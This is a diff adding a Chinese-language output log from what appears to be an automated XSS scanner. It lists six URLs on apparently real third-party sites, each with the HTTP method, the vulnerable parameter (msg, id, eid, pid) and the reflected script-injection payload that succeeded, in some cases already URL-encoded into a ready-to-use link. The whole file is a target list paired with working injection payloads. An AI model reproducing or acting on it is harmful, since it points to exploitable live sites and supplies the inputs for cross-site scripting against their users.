@@ -1,0 +1,30 @@
+检测网址 : http://38046.waw.q.knet.cn/message.aspx?msg=%3C%2Fscript%3E%22%3E%3Cscript%3Eprompt%281%29%3C%2Fscript%3E
+提交方式 : POST
+漏洞参数 : msg
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
+检测网址 : http://38046.waw.q.knet.cn/Mobile/Product/list.aspx?id=36558
+提交方式 : GET
+漏洞参数 : id
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
+检测网址 : http://38046.waw.q.knet.cn/Mobile/Product/list.aspx?id=%3C%2Fscript%3E%22%3E%3Cscript%3Eprompt%281%29%3C%2Fscript%3E
+提交方式 : POST
+漏洞参数 : id
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
+检测网址 : http://shengood.roboo.com/web/member/login.jsp?eid=6912
+提交方式 : GET
+漏洞参数 : eid
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
+检测网址 : http://shengood.roboo.com/web/member/login.jsp?eid=%3C%2Fscript%3E%22%3E%3Cscript%3Eprompt%281%29%3C%2Fscript%3E
+提交方式 : POST
+漏洞参数 : eid
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
+检测网址 : http://xhc001.qy01.cn/main1.asp?pid=6
+提交方式 : GET
+漏洞参数 : pid
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
